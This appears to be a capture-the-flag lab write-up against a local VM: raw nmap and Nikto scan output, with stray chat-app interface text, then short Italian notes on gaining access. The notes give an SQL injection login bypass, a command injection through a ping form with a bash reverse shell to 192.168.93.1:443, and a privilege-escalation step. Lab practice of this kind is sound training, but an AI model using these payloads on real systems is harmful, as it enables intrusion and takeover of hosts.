nmap:


# Nmap 7.70 scan initiated Wed Jun 5 11:45:50 2019 as: nmap -sS --script (default or safe or vuln) and not broadcast -p- -T5 --min-rate 1000 -v -oA nmap.txt 192.168.93.103
Pre-scan script results:
| targets-asn:
|_ targets-asn.asn is a mandatory parameter
Nmap scan report for 192.168.93.103
Host is up (0.0028s latency).
Not shown: 65528 closed ports
PORT STATE SERVICE
22/tcp open ssh
|_banner: SSH-1.99-OpenSSH_3.9p1
| ssh-hostkey:
| 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
| 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
| ssh2-enum-algos:
| kex_algorithms: (3)
| diffie-hellman-group-exchange-sha1
| diffie-hellman-group14-sha1
| diffie-hellman-group1-sha1
| server_host_key_algorithms: (2)
| ssh-rsa
| ssh-dss
| encryption_algorithms: (11)
| aes128-cbc
| 3des-cbc
| blowfish-cbc
| cast128-cbc
| arcfour
| aes192-cbc
| aes256-cbc
| rijndael-cbc@lysator.liu.se
| aes128-ctr
| aes192-ctr
| aes256-ctr
| mac_algorithms: (6)
| hmac-md5
| hmac-sha1
| hmac-ripemd160
| hmac-ripemd160@openssh.com
| hmac-sha1-96
| hmac-md5-96
| compression_algorithms: (2)
| none
|_ zlib
|_sshv1: Server supports SSHv1
80/tcp open http
| http-auth-finder:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.93.103
| url method
| http://192.168.93.103:80/           FORM
|_ http://192.168.93.103:80/index.php  FORM
| http-comments-displayer:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.93.103
|
| Path: http://192.168.93.103:80/index.php
| Line number: 28
| Comment:
|_ <!-- Start of HTML when logged in as Administator -->
| http-csrf:
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.93.103
| Found the following possible CSRF vulnerabilities:
|
| Path: http://192.168.93.103:80/
| Form id: frmlogin
| Form action: index.php
|
| Path: http://192.168.93.103:80/index.php
| Form id: frmlogin
|_ Form action: index.php
|_http-date: Wed, 05 Jun 2019 15:46:31 GMT; +6h00m00s from local time.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum:
| /icons/: Potentially interesting directory w/ listing on 'apache/2.0.52 (centos)'
|_ /manual/: Potentially interesting folder
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers:
| Date: Wed, 05 Jun 2019 15:46:30 GMT
| Server: Apache/2.0.52 (CentOS)
| X-Powered-By: PHP/4.3.9
| Connection: close
| Content-Type: text/html; charset=UTF-8
|
|_ (Request type: HEAD)
|_http-malware-host: Host appears to be clean
| http-methods:
|_ Supported Methods: GET HEAD POST OPTIONS
|_http-mobileversion-checker: No mobile version detected.
| http-php-version: Versions from credits query (more accurate): 4.3.9 - 4.3.11
|_Version from header x-powered-by: PHP/4.3.9
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-security-headers:
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-trace: TRACE is enabled
| http-traceroute:
|_ Possible reverse proxy detected.
| http-useragent-tester:
| Status for browser useragent: 200
| Allowed User Agents:
| Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
| libwww
| lwp-trivial
| libcurl-agent/1.0
| PHP/
| Python-urllib/2.5
| GT::WWW
| Snoopy
| MFC_Tear_Sample
| HTTP::Lite
| PHPCrawl
| URI::Fetch
| Zend_Http_Client
| http client
| PECL::HTTP
| Wget/1.13.4 (linux-gnu)
|_ WWW-Mechanize/1.34
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-xssed: No previously reported XSS vuln.
111/tcp open rpcbind
| rpcinfo:
| program version port/proto service
| 100000
19:08

Reply
Edit
Copy Selected Text
Pin
Forward
Select
Delete
2 111/tcp rpcbind
| 100000 2 111/udp rpcbind
| 100024 1 809/udp status
|_ 100024 1 812/tcp status
443/tcp open https
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-comments-displayer: Couldn't find any comments.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-malware-host: Host appears to be clean
|_http-mobileversion-checker: No mobile version detected.
|_http-referer-checker: Couldn't find any cross-domain scripts.
| http-security-headers:
| Strict_Transport_Security:
|_ HSTS not configured in HTTPS Server
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-useragent-tester:
| Allowed User Agents:
| Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
| libwww
| lwp-trivial
| libcurl-agent/1.0
| PHP/
| Python-urllib/2.5
| GT::WWW
| Snoopy
| MFC_Tear_Sample
| HTTP::Lite
| PHPCrawl
| URI::Fetch
| Zend_Http_Client
| http client
| PECL::HTTP
| Wget/1.13.4 (linux-gnu)
|_ WWW-Mechanize/1.34
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-xssed: No previously reported XSS vuln.
| ssl-ccs-injection:
| VULNERABLE:
| SSL/TLS MITM vulnerability (CCS Injection)
| State: VULNERABLE
| Risk factor: High
| OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
| does not properly restrict processing of ChangeCipherSpec messages,
| which allows man-in-the-middle attackers to trigger use of a zero
| length master key in certain OpenSSL-to-OpenSSL communications, and
| consequently hijack sessions or obtain sensitive information, via
| a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|
| References:
| http://www.cvedetails.com/cve/2014-0224
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|_ http://www.openssl.org/news/secadv_20140605.txt
|_ssl-date: 2019-06-05T15:46:01+00:00; +5h59m59s from scanner time.
| ssl-dh-params:
| VULNERABLE:
| Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
| State: VULNERABLE
| IDs: OSVDB:122331 CVE:CVE-2015-4000
| The Transport Layer Security (TLS) protocol contains a flaw that is
| triggered when handling Diffie-Hellman key exchanges defined with
| the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
| to downgrade the security of a TLS session to 512-bit export-grade
| cryptography, which is significantly weaker, allowing the attacker
| to more easily break the encryption and monitor or tamper with
| the encrypted stream.
| Disclosure date: 2015-5-19
| Check results:
| EXPORT-GRADE DH GROUP 1
| Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
| Modulus Type: Safe prime
| Modulus Source: mod_ssl 2.0.x/512-bit MODP group with safe prime modulus
| Modulus Length: 512
| Generator Length: 8
| Public Key Length: 512
| References:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
| https://weakdh.org
| http://osvdb.org/122331
|
| Diffie-Hellman Key Exchange Insufficient Group Strength
| State: VULNERABLE
| Transport Layer Security (TLS) services that use Diffie-Hellman groups
| of insufficient strength, especially those using one of a few commonly
| shared groups, may be susceptible to passive eavesdropping attacks.
| Check results:
| WEAK DH GROUP 1
| Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
| Modulus Type: Safe prime
| Modulus Source: mod_ssl 2.0.x/1024-bit MODP group with safe prime modulus
| Modulus Length: 1024
| Generator Length: 8
| Public Key Length: 1024
|
19:08

References:
|_ https://weakdh.org
| ssl-poodle:
| VULNERABLE:
| SSL POODLE information leak
| State: VULNERABLE
| IDs: OSVDB:113251 CVE:CVE-2014-3566
| The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
| products, uses nondeterministic CBC padding, which makes it easier
| for man-in-the-middle attackers to obtain cleartext data via a
| padding-oracle attack, aka the "POODLE" issue.
| Disclosure date: 2014-10-14
| Check results:
| TLS_RSA_WITH_AES_128_CBC_SHA
| References:
| http://osvdb.org/113251
| https://www.imperialviolet.org/2014/10/14/poodle.html
| https://www.openssl.org/~bodo/ssl-poodle.pdf
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| sslv2:
| SSLv2 supported
| ciphers:
| SSL2_RC4_64_WITH_MD5
| SSL2_RC4_128_EXPORT40_WITH_MD5
| SSL2_DES_192_EDE3_CBC_WITH_MD5
| SSL2_DES_64_CBC_WITH_MD5
| SSL2_RC2_128_CBC_WITH_MD5
| SSL2_RC4_128_WITH_MD5
|_ SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| sslv2-drown:
| ciphers:
| SSL2_RC4_64_WITH_MD5
| SSL2_RC4_128_EXPORT40_WITH_MD5
| SSL2_DES_192_EDE3_CBC_WITH_MD5
| SSL2_DES_64_CBC_WITH_MD5
| SSL2_RC2_128_CBC_WITH_MD5
| SSL2_RC4_128_WITH_MD5
| SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| vulns:
| CVE-2016-0703:
| title: OpenSSL: Divide-and-conquer session key recovery in SSLv2
| state: VULNERABLE
| ids:
| CVE:CVE-2016-0703
| description:
| The get_client_master_key function in s2_srvr.c in the SSLv2 implementation in
| OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before
| 1.0.2a accepts a nonzero CLIENT-MASTER-KEY CLEAR-KEY-LENGTH value for an arbitrary
| cipher, which allows man-in-the-middle attackers to determine the MASTER-KEY value
| and decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding oracle, a
| related issue to CVE-2016-0800.
|
| refs:
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0703
| https://www.openssl.org/news/secadv/20160301.txt
| CVE-2016-0800:
| title: OpenSSL: Cross-protocol attack on TLS using SSLv2 (DROWN)
| state: VULNERABLE
| ids:
| CVE:CVE-2016-0800
| description:
| The SSLv2 protocol, as used in OpenSSL before 1.0.1s and 1.0.2 before 1.0.2g and
| other products, requires a server to send a ServerVerify message before establishing
| that a client possesses certain plaintext RSA data, which makes it easier for remote
| attackers to decrypt TLS ciphertext data by leveraging a Bleichenbacher RSA padding
| oracle, aka a "DROWN" attack.
|
| refs:
| https://www.openssl.org/news/secadv/20160301.txt
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0800
631/tcp open ipp
|_cups-info: ERROR: Script execution failed (use -d to debug)
|_cups-queue-info: ERROR: Script execution failed (use -d to debug)
|_http-date: Wed, 05 Jun 2019 15:46:20 GMT; +5h59m59s from local time.
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-headers:
| Date: Wed, 05 Jun 2019 15:46:39 GMT
| Server: CUPS/1.1
| Content-Language: en_US
| Upgrade: TLS/1.0,HTTP/1.1
| Connection: close
| Content-Type: text/html
| Content-Length: 150
|
|_ (Request type: GET)
|_http-malware-host: Host appears to be clean
| http-methods:
| Supported Methods: GET HEAD OPTIONS POST PUT
|_ Potentially risky methods: PUT
|_http-title: 403 Forbidden
812/tcp open status
3306/tcp open mysql
| banner: E\x00\x00\x00\xFFj\x04Host '192.168.93.1' is not allowed to con
|_nect to this MySQL server
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 08:00:27:B7:EF:F9 (Oracle VirtualBox virtual NIC)

Host script results:
|_clock-skew: mean: 5h59m59s, deviation: 0s, median: 5h59m58s
|_fcrdns: FAIL (No PTR record)
|_ipidseq: All zeros
|_path-mtu: PMTU == 1500
| qscan:
19:08

| PORT FAMILY MEAN (us) STDDEV LOSS (%)
| 1 0 547.10 176.81 0.0%
| 22 0 588.80 165.05 0.0%
| 80 0 568.00 219.11 0.0%
| 111 0 616.10 233.43 0.0%
| 443 0 596.00 207.06 10.0%
| 631 0 640.00 120.75 0.0%
| 812 0 655.10 115.05 0.0%
|_3306 0 553.90 165.37 0.0%
| unusual-port:
|_ WARNING: this script depends on Nmap's service/version detection (-sV)

Post-scan script results:
| reverse-index:
| 22/tcp: 192.168.93.103
| 80/tcp: 192.168.93.103
| 111/tcp: 192.168.93.103
| 443/tcp: 192.168.93.103
| 631/tcp: 192.168.93.103
| 812/tcp: 192.168.93.103
|_ 3306/tcp: 192.168.93.103
Read data files from: /usr/bin/../share/nmap
# Nmap done at Wed Jun 5 11:51:34 2019 -- 1 IP address (1 host up) scanned in 344.26 seconds

Nikto:


- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP: 192.168.93.103
+ Target Hostname: 192.168.93.103
+ Target Port: 80
+ Start Time: 2019-06-05 11:48:36 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.0.52 (CentOS)
+ Retrieved x-powered-by header: PHP/4.3.9
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ Uncommon header 'tcn' found, with contents: choice
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 19:41:04 1980
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8725 requests: 1 error(s) and 17 item(s) reported on remote host
+ End Time: 2019-06-05 11:49:48 (GMT2) (72 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

Cosa ho fatto:

1) noto form in :80
2) provo con brute force... niente
3) noto che c'è un database in esecuzione
4) provo payload sql injection tramite insider di burp
5) trovo vulnerabilità user= ' or 0=0 # pass= qualunque
6) dentro possibilità di fare ping e ; altri comandi
7) ping: 127.0.0.1; bash -i >& /dev/tcp/192.168.93.1/443 0>&1;
8) ottengo reverse shell...

per root:

1)ottenuta la reverse shell cercarsi l'exploit per la priv escalation
2) passarsela e compilarla ed eseguirla
3) sei root.